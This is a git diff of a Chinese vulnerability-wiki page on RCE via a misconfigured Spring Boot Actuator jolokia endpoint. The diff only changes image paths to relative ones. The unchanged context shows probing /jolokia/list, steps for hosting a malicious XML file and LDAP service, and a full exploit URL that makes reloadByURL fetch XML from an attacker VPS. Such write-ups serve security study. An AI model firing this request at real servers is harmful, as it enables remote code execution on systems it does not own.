@@ -37,7 +37,7 @@ Spring Boot Actuator jolokia 配置不当导致的rce漏洞
 
 访问 **/jolokia/list** 接口，查看是否存在
 **ch.qos.logback.classic.jmx.JMXConfigurator** 和 **reloadByURL**
-关键词。![111.png](/Users/aresx/Documents/VulWiki/.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId28.png)![222.png](/Users/aresx/Documents/VulWiki/.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId29.png)
+关键词。![111.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId28.png)![222.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId29.png)
 
 ### 步骤二：托管 xml 文件
 
@@ -141,7 +141,7 @@ Spring Boot Actuator jolokia 配置不当导致的rce漏洞
         }
     }
 
-![444.png](/Users/aresx/Documents/VulWiki/.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId32.png)
+![444.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId32.png)
 
 ### 步骤四：架设恶意 ldap 服务
 
@@ -165,4 +165,4 @@ Spring Boot Actuator jolokia 配置不当导致的rce漏洞
 
     https://www.0-sec.org/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/ian.xml
 
-**服务器请求日志**![请求1.png](/Users/aresx/Documents/VulWiki/.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId36.png)![请求2.png](/Users/aresx/Documents/VulWiki/.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId37.png)
+**服务器请求日志**![请求1.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId36.png)![请求2.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId37.png)
